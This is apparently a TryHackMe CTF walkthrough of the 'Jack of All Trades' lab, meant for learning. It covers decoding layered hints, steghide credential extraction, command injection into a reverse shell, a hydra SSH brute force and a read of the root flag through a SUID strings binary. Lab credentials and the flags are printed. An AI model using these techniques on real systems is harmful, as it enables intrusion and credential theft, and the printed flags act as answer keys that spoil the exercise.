# Jack of All Trades

## Task 1

### 1 -- User Flag
Basic nmap scan, weird that the services are reversed with the ports:

```bash
jeffrowell@kali:~/Documents/TryHackMe/Jack of All Trades$ nmap -sC -sV -Pn -n -oN nmap/initial $IP
Starting Nmap 7.80 ( https://nmap.org ) at 2020-05-24 16:27 MDT
Nmap scan report for 10.10.111.20
Host is up (0.13s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  http    Apache httpd 2.4.10 ((Debian))
|_http-title: Jack-of-all-trades!
|_ssh-hostkey: ERROR: Script execution failed (use -d to debug)
80/tcp open  ssh     OpenSSH 6.7p1 Debian 5 (protocol 2.0)
| ssh-hostkey:
|   1024 13:b7:f0:a1:14:e2:d3:25:40:ff:4b:94:60:c5:00:3d (DSA)
|   2048 91:0c:d6:43:d9:40:c3:88:b1:be:35:0b:bc:b9:90:88 (RSA)
|   256 a3:fb:09:fb:50:80:71:8f:93:1f:8d:43:97:1e:dc:ab (ECDSA)
|_  256 65:21:e7:4e:7c:5a:e7:bc:c6:ff:68:ca:f1:cb:75:e3 (ED25519)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 64.54 second
```

The web server running on port 22 caused an issue for my browser because 22/tcp is a restricted port and FireFox doesn't allow it by default. To fix that, I followed these steps:

1. Select and copy the following preference name:
  * network.security.ports.banned.override

2. In a new tab, type or paste about:config in the address bar and press Enter/Return. Click the button promising to be careful.

3. In the search box above the list, type or paste ports and pause while the list is filtered

If the above-listed preference exists:

3. Double-click it and add a comma to the end of the list followed by the port number you need to allow. No spaces. Then click OK.

If the above-listed preference does not exist:

4. right-click anywhere on the page and choose New > String

5. In the preference name dialog, paste the name you coped and click OK

6. In the preference value dialog, type in the port number you need to allow, then click OK.

Basic gobuster scan to see what directories we have:

```bash
jeffrowell@kali:~/Documents/TryHackMe/Jack of All Trades$ gobuster dir -u http://$IP:22 -w /usr/share/wordlists/dirb/common.txt
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.111.20:22
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirb/common.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2020/05/24 16:28:34 Starting gobuster
===============================================================
/.hta (Status: 403)
/.htpasswd (Status: 403)
/.htaccess (Status: 403)
/assets (Status: 301)
/index.html (Status: 200)
/server-status (Status: 403)
===============================================================
2020/05/24 16:29:44 Finished
```

Nothing particularly interesting from the scans, so lets go look at the HTML source of the homepage:

![jack_of_all_trades_source](https://user-images.githubusercontent.com/32188816/82767161-9cf9ae80-9de2-11ea-9c33-9a2a31afaec5.png)

In the comments we get some nice hints. There is a recover login page at `/recovery.php` and also what looks like a base64 encoded string. Piping that string into `base64 -d` gives us a hint and the password:

```bash
jeffrowell@kali:~/Documents/TryHackMe/Jack of All Trades$ echo 'UmVtZW1iZXIgdG8gd2lzaCBKb2hueSBHcmF2ZXMgd2VsbCB3aXRoIGhpcyBjcnlwdG8gam9iaHVudGluZyEgSGlzIGVuY29kaW5nIHN5c3RlbXMgYXJlIGFtYXppbmchIEFsc28gZ290dGEgcmVtZW1iZXIgeW91ciBwYXNzd29yZDogdT9XdEtTcmFxCg==' | base64 -d
Remember to wish Johny Graves well with his crypto jobhunting! His encoding systems are amazing! Also gotta remember your password: u?WtKSraq
```

Checking out the `/recovery.php` page is just a basic login form:

![login_form](https://user-images.githubusercontent.com/32188816/82767275-b2bba380-9de3-11ea-8c8a-b6357d507545.png)


Interesting, so we get the password `u?WtKSraq` but we don't know what it is for. Trying to login with it on the recovery page doesn't work.... Let's keep looking. In the HTML source of the `/recovery.php` page, we get another clue:


![recovery_soruce](https://user-images.githubusercontent.com/32188816/82767208-0974ad80-9de3-11ea-9794-20f079946fd1.png)

Now piping this into base64 doesn't yield anything useful, but piping it into `base32 -d` looks like it gives us some hex:

```bash
jeffrowell@kali:~/Documents/TryHackMe/Jack of All Trades$ echo 'GQ2TOMRXME3TEN3BGZTDOMRWGUZDANRXG42TMZJWG4ZDANRXG42TOMRSGA3TANRVG4ZDOMJXGI3DCNRXG43DMZJXHE3DMMRQGY3TMMRSGA3DONZVG4ZDEMBWGU3TENZQGYZDMOJXGI3DKNTDGIYDOOJWGI3TINZWGYYTEMBWMU3DKNZSGIYDONJXGY3TCNZRG4ZDMMJSGA3DENRRGIYDMNZXGU3TEMRQG42TMMRXME3TENRTGZSTONBXGIZDCMRQGU3DEMBXHA3DCNRSGZQTEMBXGU3DENTBGIYDOMZWGI3DKNZUG4ZDMNZXGM3DQNZZGIYDMYZWGI3DQMRQGZSTMNJXGIZGGMRQGY3DMMRSGA3TKNZSGY2TOMRSG43DMMRQGZSTEMBXGU3TMNRRGY3TGYJSGA3GMNZWGY3TEZJXHE3GGMTGGMZDINZWHE2GGNBUGMZDINQ=' | base32 -d
45727a727a6f72652067756e67206775722070657271726167766e79662067622067757220657270626972656c207962747661206e657220757671717261206261206775722075627a72636e7472212056207861626a2075626a20736265747267736879206c6268206e65722c20666220757265722766206e20757661673a206f76672e796c2f3247694c443246
```

This looks like hex, so lets see if we can convert to ASCII and get anything useful:


![hex_to_ascii](https://user-images.githubusercontent.com/32188816/82767303-e1d21500-9de3-11ea-87ad-35cbd84d1523.png)

Now the ASCII text looks like a caesar cipher with rotation of 13, so we can easily decode that to get the next hint:
```bash
jeffrowell@kali:~/Documents/TryHackMe/Jack of All Trades$ echo "Erzrzore gung gur perqragvnyf gb gur erpbirel ybtva ner uvqqra ba gur ubzrcntr! V xabj ubj sbetrgshy lbh ner, fb urer'f n uvag: ovg.yl/2GiLD2F" | rot13
Remember that the credentials to the recovery login are hidden on the homepage! I know how forgetful you are, so here's a hint: bit.ly/2TvYQ2S
```

Following the `bit.ly/2TvYQ2S` link brings us to a Wikipedia page of Stegosauria. Lol, so this must be a steg challenge. We go back to the `/assets` directory and start to pull down all the images with wget.

Using steghide to extract the images since they are all JPEGs seems to be the right path. We have the password from the hint earlier `u?WtKSraq`, so maybe we can use that as the password for steghide. Trying the password on all images yields the `/recovery.php` username and password:

```bash
jeffrowell@kali:~/Documents/TryHackMe/Jack of All Trades$ steghide extract -sf stego.jpg
Enter passphrase:
wrote extracted data to "creds.txt".
jeffrowell@kali:~/Documents/TryHackMe/Jack of All Trades$ cat creds.txt
Hehe. Gotcha!

You're on the right path, but wrong image!
jeffrowell@kali:~/Documents/TryHackMe/Jack of All Trades$ steghide extract -sf jackinthebox.jpg
Enter passphrase:
steghide: could not extract any data with that passphrase
jeffrowell@kali:~/Documents/TryHackMe/Jack of All Trades$ steghide extract -sf header.jpg
Enter passphrase:
wrote extracted data to "cms.creds".
jeffrowell@kali:~/Documents/TryHackMe/Jack of All Trades$ cat cms.creds
Here you go Jack. Good thing you thought ahead!

Username: jackinthebox
Password: TplFxiSHjY
```

So using that password with steghide on the `header.jpg` image gave us the `/recovery.php` login creds! When we log into the `/recovery.php` endpoint, we are greeted with the following:

![recover php](https://user-images.githubusercontent.com/32188816/82767363-586f1280-9de4-11ea-9302-d074e55c8227.png)

So it looks like we can enter commands using a `?cmd=` variable. Let's try to inject some basic command first to see if it works:

![recovery_cmd](https://user-images.githubusercontent.com/32188816/82767393-7fc5df80-9de4-11ea-8e37-934d7e9642d7.png)

Nice, so it looks like we can inject a nc reverse shell, and catching the shell works!

```bash
jeffrowell@kali:~/Documents/TryHackMe/Jack of All Trades$ nc -lvp 1234
listening on [any] 1234 ...
10.10.111.20: inverse host lookup failed: Unknown host
connect to [10.8.21.42] from (UNKNOWN) [10.10.111.20] 60118
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
ls
index.php
```

Looking around the file system we are able to find `jacks_password_list`:
```bash
pwd
/var/www/html/nnxhweOV
cd
pwd
/var/www/html/nnxhweOV
cd /home
ls
jack
jacks_password_list
cat jacks_password_list
*hclqAzj+2GC+=0K
eN<A@n^zI?FE$I5,
X<(@zo2XrEN)#MGC
,,aE1K,nW3Os,afb
ITMJpGGIqg1jn?>@
0HguX{,fgXPE;8yF
sjRUb4*@pz<*ZITu
[8V7o^gl(Gjt5[WB
yTq0jI$d}Ka<T}PD
Sc.[[2pL<>e)vC4}
9;}#q*,A4wd{<X.T
M41nrFt#PcV=(3%p
GZx.t)H$&awU;SO<
.MVettz]a;&Z;cAC
2fh%i9Pr5YiYIf51
TDF@mdEd3ZQ(]hBO
v]XBmwAk8vk5t3EF
9iYZeZGQGG9&W4d1
8TIFce;KjrBWTAY^
SeUAwt7EB#fY&+yt
n.FZvJ.x9sYe5s5d
8lN{)g32PG,1?[pM
z@e1PmlmQ%k5sDz@
ow5APF>6r,y4krSo
```

Saving this locally to a file allows us to brute force with hydra:
```bash
jeffrowell@kali:~/Documents/TryHackMe/Jack of All Trades$ hydra -l jack -P jacks_password_list ssh://$IP:80
Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-05-24 17:01:33
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 24 login tries (l:1/p:24), ~2 tries per task
[DATA] attacking ssh://10.10.111.20:80/
[80][ssh] host: 10.10.111.20   login: jack   password: ITMJpGGIqg1jn?>@
```

After using SSH to log in as jack, looking around jack has a file named `user.jpg` in the `/home/jack` directory:

```bash
jack@jack-of-all-trades:~$ ls
user.jpg
jack@jack-of-all-trades:~$ pwd
/home/jack
```

So we scp that file down and using stegsolve.jar to look at the file we find the first flag:

![stegsolve_flag1](https://user-images.githubusercontent.com/32188816/82767438-cb788900-9de4-11ea-95ef-cfd4183c7cb2.png)



### 2 -- Root Flag

Here you know the drill. Get linpeas on the box and start to enumerate. As a result of running linpeas, we found that the `find` and `strings` commands are both owned by root, so maybe we can leverage those to get the flag. Truncated linpeas output:

```bash
[+] Readable files belonging to root and readable by me but not world readable
-rwsr-x--- 1 root dev 27536 Feb 25  2015 /usr/bin/strings
-rwxr-x--- 1 root dev 233984 Nov  8  2014 /usr/bin/find
```

Assuming the flag is in `/root/root.txt` we can try to strings that file and get the flag:

```bash
jack@jack-of-all-trades:~$ strings /root/root.txt
ToDo:
1.Get new penguin skin rug -- surely they won't miss one or two of those blasted creatures?
2.Make T-Rex model!
3.Meet up with Johny for a pint or two
4.Move the body from the garage, maybe my old buddy Bill from the force can help me hide her?
5.Remember to finish that contract for Lisa.
6.Delete this: securi-tay2020_{6f125d32f38fb8ff9e720d2dbce2210a}
```
